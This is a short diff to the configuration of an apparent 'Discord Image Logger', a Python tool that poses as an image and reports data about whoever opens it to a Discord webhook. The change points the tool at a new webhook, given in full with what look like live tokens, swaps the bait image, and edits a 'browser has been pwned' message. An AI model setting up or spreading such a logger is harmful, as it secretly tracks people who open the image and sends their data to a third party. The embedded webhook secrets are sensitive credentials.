@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1419145126739050638/XfkDbuJjAjGxzgGFTXpterNOM6jkS5RILOKwHyyxtFFie4A17DD2IUEP7mVPQP43OifG",
+    "image": "https://cdn-offer-photos.zeusx.com/49acf98b-886b-4381-8809-101aa9c9dbb9.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by the Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
